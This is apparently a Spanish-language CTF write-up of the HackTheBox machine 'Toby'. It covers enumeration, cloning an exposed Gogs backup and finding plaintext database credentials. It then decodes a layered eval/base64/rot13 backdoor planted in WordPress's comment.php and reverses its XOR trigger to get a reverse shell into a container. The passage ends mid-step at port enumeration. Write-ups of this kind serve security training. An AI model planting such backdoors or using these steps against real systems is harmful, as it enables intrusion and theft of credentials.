@@ -1,0 +1,1242 @@
+---
+layout: post
+title: Toby
+date: 2023-03-10
+description:
+img:
+fig-caption:
+tags: [eWPT, eWPTXv2, OSWE, eCPPTv2, eCPTXv2]
+---
+___
+
+<center><img src="/writeups/assets/img/Toby-htb/Toby.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Enumeración Web
+
+* Análisis de código PHP
+
+* Deofuscación de código
+
+* Abuso de Backdoor
+
+* Pivoting 1
+
+* Abuso de API
+
+* Análisis de código en Python
+
+* Python Scripting
+
+* Uso de Epoch para generar semillas de contraseñas
+
+* Pivoting 2
+
+* Abuso de tarea CRON
+
+* Decrypt de contenido en AES
+
+* Abuso de PAM
+
+* Análisis de código en Ghidra
+
+* Obtención de contraseñas abusando de un BackDoor (Escalada de Privilegios)
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.121 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 12:50 GMT
+Nmap scan report for 10.10.11.121
+Host is up (0.060s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+10022/tcp open  unknown
+10080/tcp open  amanda
+
+Nmap done: 1 IP address (1 host up) scanned in 18.19 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p22,80,10022,10080 10.10.11.121 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 13:12 GMT
+Nmap scan report for 10.10.11.121
+Host is up (0.23s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 87ee18b25a01e3acaa5fcb37592ae64f (RSA)
+|   256 3d06828aec12bdc3ecfed5cea0f2e6b9 (ECDSA)
+|_  256 d56e9ba27de01eafa38d35a87dd92274 (ED25519)
+80/tcp    open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Toby&#039;s Blog! \xF0\x9F\x90\xB4 &#8211; Just another WordPress site
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-generator: WordPress 5.7.2
+10022/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 658c9b896485eaadd9dfd0fc6cd197e5 (RSA)
+|   256 255edd7b094fd78a8e48eef45213d485 (ECDSA)
+|_  256 7488252d3d80ab03b9f903fc0a37f7e9 (ED25519)
+10080/tcp open  amanda?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     Set-Cookie: i_like_gogs=e937fb372177ee90; Path=/; HttpOnly
+|     Set-Cookie: _csrf=wbm_vreORVm2MSfWLMyJtPhDsgE6MTY3ODQ1Mzk4ODEwNDY5Mzc3MQ; Path=/; Domain=backup.toby.htb; Expires=Sat, 11 Mar 2023 13:13:08 GMT; HttpOnly
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: DENY
+|     Date: Fri, 10 Mar 2023 13:13:08 GMT
+|     <!DOCTYPE html>
+|     <html>
+|     <head data-suburl="">
+|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+|     <meta name="author" content="Gogs" />
+|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
+|     <meta name="keywords" content="go, git, self-hosted, gogs">
+|     <meta name="referrer" content="no-referrer" />
+|     <meta name="_csrf" content="wbm_vreORVm2MSfWLMyJtPhDsgE6MTY3ODQ1Mzk4ODE
+|   HTTPOptions: 
+|     HTTP/1.0 500 Internal Server Error
+|     Content-Type: text/plain; charset=utf-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     X-Content-Type-Options: nosniff
+|     Date: Fri, 10 Mar 2023 13:13:08 GMT
+|     Content-Length: 108
+|_    template: base/footer:15:47: executing "base/footer" at <.PageStartTime>: invalid value; expected time.Time
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port10080-TCP:V=7.93%I=7%D=3/10%Time=640B2CE0%P=x86_64-pc-linux-gnu%r(G
+SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
+SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
+SF:x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:
+SF:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/
+SF:;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=e937fb372177ee90;
+SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=wbm_vreORVm2MSfWLMyJtPh
+SF:DsgE6MTY3ODQ1Mzk4ODEwNDY5Mzc3MQ;\x20Path=/;\x20Domain=backup\.toby\.htb
+SF:;\x20Expires=Sat,\x2011\x20Mar\x202023\x2013:13:08\x20GMT;\x20HttpOnly\
+SF:r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDa
+SF:te:\x20Fri,\x2010\x20Mar\x202023\x2013:13:08\x20GMT\r\n\r\n<!DOCTYPE\x2
+SF:0html>\n<html>\n<head\x20data-suburl=\"\">\n\t<meta\x20http-equiv=\"Con
+SF:tent-Type\"\x20content=\"text/html;\x20charset=UTF-8\"\x20/>\n\t<meta\x
+SF:20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"/>\n\t\n\t\t<met
+SF:a\x20name=\"author\"\x20content=\"Gogs\"\x20/>\n\t\t<meta\x20name=\"des
+SF:cription\"\x20content=\"Gogs\x20is\x20a\x20painless\x20self-hosted\x20G
+SF:it\x20service\"\x20/>\n\t\t<meta\x20name=\"keywords\"\x20content=\"go,\
+SF:x20git,\x20self-hosted,\x20gogs\">\n\t\n\t<meta\x20name=\"referrer\"\x2
+SF:0content=\"no-referrer\"\x20/>\n\t<meta\x20name=\"_csrf\"\x20content=\"
+SF:wbm_vreORVm2MSfWLMyJtPhDsgE6MTY3ODQ1Mzk4ODE")%r(HTTPOptions,14A,"HTTP/1
+SF:\.0\x20500\x20Internal\x20Server\x20Error\r\nContent-Type:\x20text/plai
+SF:n;\x20charset=utf-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;\x20Max-Age
+SF:=2147483647\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Fri,\x201
+SF:0\x20Mar\x202023\x2013:13:08\x20GMT\r\nContent-Length:\x20108\r\n\r\nte
+SF:mplate:\x20base/footer:15:47:\x20executing\x20\"base/footer\"\x20at\x20
+SF:<\.PageStartTime>:\x20invalid\x20value;\x20expected\x20time\.Time\n")%r
+SF:(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
+SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
+SF:\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
+SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
+SF:0\x20Bad\x20Request");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 126.11 seconds
+```
+
+Agrego los sudominos y el dominio ```backup.toby.htb```, ```wordpress.toby.htb```, ```toby.htb``` al ```/etc/hosts```
+
+## Puerto 80 (HTTP)
+
+Con ```whatweb``` analizo las tecnologías que está empleando el servidor web
+
+```null
+whatweb http://10.10.11.121
+http://10.10.11.121 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.121], MetaGenerator[WordPress 5.7.2], PHP[7.4.21], PoweredBy[--], Script, Title[Toby&#039;s Blog! 🐴 &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.7.2], X-Powered-By[PHP/7.4.21], nginx[1.18.0]
+```
+
+La página principal se ve así:
+
+<img src="/writeups/assets/img/Toby-htb/1.png" alt="">
+
+Aplico fuzzin para ver subdominios
+
+```null
+gobuster vhost -u http://toby.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 30
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://toby.htb
+[+] Method:       GET
+[+] Threads:      30
+[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2023/03/10 16:02:58 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: backup.toby.htb (Status: 200) [Size: 7938]
+Found: wordpress.toby.htb (Status: 200) [Size: 10781]
+Found: www.wordpress.toby.htb (Status: 301) [Size: 0]
+                                                     
+===============================================================
+2023/03/10 16:06:03 Finished
+===============================================================
+```
+
+En ```backup.toby.htb``` hay un GOGS
+
+<img src="/writeups/assets/img/Toby-htb/2.png" alt="">
+
+Puedo ver un usuario sin estar autenticado
+
+<img src="/writeups/assets/img/Toby-htb/3.png" alt="">
+
+Me registro en el servicio
+
+<img src="/writeups/assets/img/Toby-htb/4.png" alt="">
+
+Creo un repositorio de prueba
+
+<img src="/writeups/assets/img/Toby-htb/5.png" alt="">
+
+La URL está compuesta por el usuario seguido del nombre del proyecto. Aplico fuzzing para descubrir los posibles de ```toby-admin```
+
+```null
+wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://backup.toby.htb/toby-admin/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://backup.toby.htb/toby-admin/FUZZ
+Total requests: 220546
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+=====================================================================
+
+000001612:   200        453 L    986 W      14025 Ch    "backup"                                                                                                                                        
+000001904:   200        0 L      0 W        0 Ch        "stars"                                                                                                                                         
+000003169:   200        453 L    986 W      14025 Ch    "Backup"
+```
+
+Accedo al ```backup```, ya que no está privado, si no oculto
+
+```null
+git clone http://backup.toby.htb/toby-admin/backup
+Cloning into 'backup'...
+remote: Enumerating objects: 1613, done.
+remote: Counting objects: 100% (1613/1613), done.
+remote: Compressing objects: 100% (1433/1433), done.
+remote: Total 1613 (delta 123), reused 1613 (delta 123)
+Receiving objects: 100% (1613/1613), 10.80 MiB | 1.08 MiB/s, done.
+Resolving deltas: 100% (123/123), done.
+```
+
+Corresponde a la página principal
+
+```null
+ls
+index.php    readme.html      wp-admin		 wp-comments-post.php	wp-config.php	     wp-content   wp-includes	     wp-load.php   wp-mail.php      wp-signup.php     xmlrpc.php
+license.txt  wp-activate.php  wp-blog-header.php  wp-config-docker.php	wp-config-sample.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php
+```
+
+En el ```wp-config.php``` hay credenciales en texto claro
+
+```null
+ /** MySQL database username */
+ define( 'DB_USER', 'root' );
+ 
+ /** MySQL database password */
+ define( 'DB_PASSWORD', 'OnlyTheBestSecretsGoInShellScripts' );
+ 
+ /** MySQL hostname */
+ define( 'DB_HOST', 'mysql.toby.htb' );
+```
+
+Hay demasiados archivos ```PHP```
+
+```null
+find \-name \*.php | xargs batcat -l php | wc -l
+424594
+```
+
+Con el fin de encontrar vulnerabilidades en el código, utilizo una herramienta llamada ```php-malware-scanner```, disponible en [Github](https://github.com/scr34m/php-malware-scanner). Encuentra 4 archivos sospechosos
+
+```null
+../php-malware-scanner/scan -L | grep -v OK
+# ER # {/home/rubbx/Desktop/HTB/Machines/Toby/backup/wordpress.toby.htb/html/wp-admin/includes/class-pclzip.php} # 5712
+# ER # {/home/rubbx/Desktop/HTB/Machines/Toby/backup/wordpress.toby.htb/html/wp-config-docker.php} # 121
+# ER # {/home/rubbx/Desktop/HTB/Machines/Toby/backup/wordpress.toby.htb/html/wp-includes/formatting.php} # 3036
+# ER # {/home/rubbx/Desktop/HTB/Machines/Toby/backup/wordpress.toby.htb/html/wp-includes/comment.php} # 3405
+Start time: 2023-03-10 22:03:37
+End time: 2023-03-10 22:03:38
+Total execution time: 1
+Base directory: /home/rubbx/Desktop/HTB/Machines/Toby/backup/wordpress.toby.htb/html
+Total directories scanned: 118
+Total files scanned: 743
+Total malware identified: 4
+```
+
+Una función contiene una cantidad inmensa de caracteres
+
+```null
+    eval(gzuncompress(str_rot13(base64_decode('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
+...
+```
+
+La almaceno a un archivo
+
+```null
+cat /home/rubbx/Desktop/HTB/Machines/Toby/backup/wordpress.toby.htb/html/wp-includes/comment.php | awk 'NR==3405' > data
+```
+
+Le cambio el ```eval``` por un ```print``` y lo meto todo entre etiquetas PHP. Al volver a ejecutar, el ```print``` se convierte a ```eval``` en el output. Pero es distinto a lo que ya tenía
+
+```null
+eval(gzinflate(base64_decode(str_rot13('UW3UohgXSxH/ck/NNGASQaeNGQUaAUytmwam61ih0LIuJIrfdeC3JeVxS2sF/1B9mIw2lI78xlMoDJQ/5xH25pH/276hksa3m7/egZCbC//5739oSu02RR0n8YE4mvly1iBqZ28QtTjRwRUD0hPMOcrH1lrCG8BAqEeXR9nX39Qt6q4/xvoxXinhALAzkI0k2qgbwVXg76vAkgzUmG57+HZ1J08glfp4NmpL2eyCGu856vQQRWv4ei1XVP2tsW1G5zuaRZzai3xGFDXtL4jhNg9tFwKhKRDcD/MKn8iIvQZ00BrRTGjuUEXnjVLYgGR7Pc3imJs3yAJmkBBsI26l6saDk/hDrciaYlGx+SGEp0kFDirf8YvMtTXnmX7VhJsLUq/RQhHXw8eQ7btkhp1JGb9Eg1tAzfBy7+ocOSNP0WUgXBK2aJKhhuLSuCYLQcz0VakEVdhE8wfFfXnSSGP5O6Ol+2YO8PB97BIifzPfHBYwr0dePnq8+Cy9lMpypxYeNYvxGjc94usi4jWutOceccbROmUkMMV+VyLpFPB8xI2DSmfPoDvV0rlg0d7N/CG7fnFCfBh38BD
+```
+
+Puedo tratar de hacer esto mismo una inmensa cantidad de veces, tomando el script que imprime como semilla, para calcular el otro, hasta que toda la data se deserialice y poder ver el script en texto claro
+
+```null
+mv data data1
+```
+
+```null
+#!/bin/bash
+
+for i in $(seq 1 100); do
+  sed -i 's/eval/<?php print/' data$i
+  php data$i > data$(($i+1))
+done
+```
+
+```null
+./test.sh
+```
+
+El peso de cada uno se va reduciendo por iteración, hasta que llega un punto en el que se mantiene constante
+
+```null
+du -hc * | xargs
+148K data1 88K data10 4.0K data100 4.0K data101 88K data11 68K data12 68K data13 68K data14 68K data15 68K data16 68K data17 52K data18 48K data19 148K data2 48K data20 48K data21 48K data22 48K data23 48K data24 48K data25 48K data26 44K data27 40K data28 32K data29 148K data3 28K data30 28K data31 28K data32 32K data33 24K data34 16K data35 16K data36 16K data37 16K data38 16K data39 144K data4 16K data40 16K data41 16K data42 16K data43 12K data44 12K data45 12K data46 12K data47 12K data48 12K data49 144K data5 12K data50 12K data51 12K data52 12K data53 12K data54 8.0K data55 8.0K data56 8.0K data57 8.0K data58 8.0K data59 160K data6 8.0K data60 8.0K data61 8.0K data62 8.0K data63 8.0K data64 4.0K data65 4.0K data66 4.0K data67 4.0K data68 4.0K data69 120K data7 4.0K data70 4.0K data71 4.0K data72 4.0K data73 4.0K data74 4.0K data75 4.0K data76 4.0K data77 4.0K data78 4.0K data79 92K data8 4.0K data80 4.0K data81 4.0K data82 4.0K data83 4.0K data84 4.0K data85 4.0K data86 4.0K data87 4.0K data88 4.0K data89 88K data9 4.0K data90 4.0K data91 4.0K data92 4.0K data93 4.0K data94 4.0K data95 4.0K data96 4.0K data97 4.0K data98 4.0K data99 4.0K test.sh 3.0M total
+```
+
+El script es así:
+
+```null
+if($comment_author_email=="help@toby.htb"&&$comment_author_url=="http://test.toby.htb/"&&substr($comment_content,0,8)=="746f6279"){$a=substr($comment_content,8);$host=explode(":",$a)[0];$sec=explode(":",$a)[1];$d="/usr/bin/wordpress_comment_validate";include $d;wp_validate_4034a3($host,$sec);return new WP_Error('unspecified error');}
+```
+
+Lo transformo para verlo más claro
+
+```null
+<?php
+if($comment_author_email=="help@toby.htb" && $comment_author_url=="http://test.toby.htb/" && substr($comment_content,0,8)=="746f6279"){$a=substr($comment_content,8);
+  $host=explode(":",$a)[0];
+  $sec=explode(":",$a)[1];
+  $d="/usr/bin/wordpress_comment_validate";
+  include $d;
+  wp_validate_4034a3($host,$sec);
+  return new WP_Error('unspecified error');
+}
+?>
+```
+
+Esto se comunica con la sección de los comentarios del ```Wordpress```, en caso de que todos los datos correspondan a los que están definidos, se va a ejecutar una acción. Para poder indicar el host y otros parámetros, se hace tomando los ":" como delimitadores
+
+<img src="/writeups/assets/img/Toby-htb/6.png" alt="">
+
+Al enviar recibo un error
+
+<img src="/writeups/assets/img/Toby-htb/7.png" alt="">
+
+Pero es posible que se esté tramitando algún tipo de petición a mi equipo y que no la esté viendo. Abro el ```wireshark``` para analizar el tráfico por la interfaz ```tun0```
+
+<img src="/writeups/assets/img/Toby-htb/8.png" alt="">
+
+Un paquete es RST. Esto es debido a que se está intentando comunicar con un puerto que está cerrado
+
+<img src="/writeups/assets/img/Toby-htb/9.png" alt="">
+
+Me pongo en escucha y recibo data
+
+```null
+nc -nlvp 20053
+listening on [any] 20053 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.11.121] 57506
+4e9dc819-c9e9-43b2-b570-9d954090a2e9|786f725f6b65793a30663031316431623134313630313032306431633162303731623066303131643162313731313032303230643163
+```
+
+Parece hexadecimal la segunda parte
+
+```null
+echo 786f725f6b65793a30663031316431623134313630313032306431633162303731623066303131643162313731313032303230643163 | xxd -ps -r; echo
+xor_key:0f011d1b141601020d1c1b071b0f011d1b171102020d1c
+```
+
+Y tengo otro valor que lo puedo pasar también ASCII, pero esta no es legible. Puede ser el resultado de xorear dos valores. Antes había introducido un número como segundo valor, lo cambio y comparo con la cadena de antes. En vez de ```4444```, envío ```5555```
+
+```null
+nc -nlvp 20053
+listening on [any] 20053 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.11.121] 57618
+23f60547-fca2-4bcd-b44b-2255d576e723|786f725f6b65793a31653130306330613035303731303133316330643061313130613165313030633061303630303133313331633064
+```
+
+Es distinto, por lo que sí que depende de este valor. En ```CyberChef```, lo introduzco como key al aplicar el xor
+
+<img src="/writeups/assets/img/Toby-htb/10.png" alt="">
+
+Otra forma de llegar a esta misma conclusión, es tomando en consideración que xor es asociativo, por lo que al tener el valor de dos se puede obtener el otro
+
+```null
+a ^ b = c
+```
+
+Envío como payload dos ceros
+
+```null
+nc -nlvp 20053
+listening on [any] 20053 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.11.121] 58784
+62c20e4f-4685-4c15-82db-85f8468443c0|786f725f6b65793a30663031316431623134313630313032306431633162303131623066303131643162313731313032303230643163
+```
+
+De esta forma se puede obtener el resultado en un oneliner sin emplear xor
+
+```null
+echo 786f725f6b65793a34623435353935663530353234353436343935383566346235663462343535393566353335353436343634393538 | xxd -ps -r | awk '{print $2}' FS=":" | xxd -ps -r; echo
+KEY_PREFIX_K_KEY_SUFFIX
+```
+
+El caracter que está entre ```_PREFIX``` y ```_KEY``` es dinámico. Voy a suponer que es una key, que se utiliza para transformar el comando que se desea ejecutar
+
+<img src="/writeups/assets/img/Toby-htb/11.png" alt="">
+
+<img src="/writeups/assets/img/Toby-htb/12.png" alt="">
+
+Me envío una reverse shell y gano acceso al sistema
+
+```null
+nc -nlvp 20053
+listening on [any] 20053 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.11.121] 34534
+f75c1c60-5606-49ca-b0b8-11bc6a123748|786f725f6b65793a34623435353935663530353234353436343935383566353535663462343535393566353335353436343634393538
+74&=ux6ur74&=ux<uksuz10#z!6%zde{de{dc{lzaafueksdr
+```
+
+```null
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.11.121] 59056
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@wordpress:/var/www/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@wordpress:/var/www/html$ ^Z
+zsh: suspended  nc -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  nc -nlvp 443
+                              reset xterm
+www-data@wordpress:/var/www/html$ export TERM=xterm
+www-data@wordpress:/var/www/html$ export SHELL=bash
+www-data@wordpress:/var/www/html$ stty rows 55 columns 209
+```
+
+En la raíz está el archivo ```entrypoint.sh```
+
+```null
+www-data@wordpress:/$ cat entrypoint.sh 
+service vsftpd start
+bash -c 'sleep 10; mv /comment.php /var/www/html/wp-includes/comment.php' &
+bash docker-entrypoint.sh apache2-foreground
+www-data@wordpress:/$ 
+```
+
+Estoy dentro de un contenedor
+
+```null
+www-data@wordpress:/var/www/html$ whoami
+www-data
+www-data@wordpress:/var/www/html$ hostname -I
+172.69.0.101 
+```
+
+Se está iniciando el demonio de FTP. Puedo conectarme con un null session, pero no hay nada
+
+```null
+www-data@wordpress:/$ ftp localhost
+Connected to localhost.
+220 (vsFTPd 3.0.3)
+Name (localhost:www-data): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+```
+
+Para ver todos los puertos abiertos, leo la ruta ```/proc/net/tcp```
+
+```null
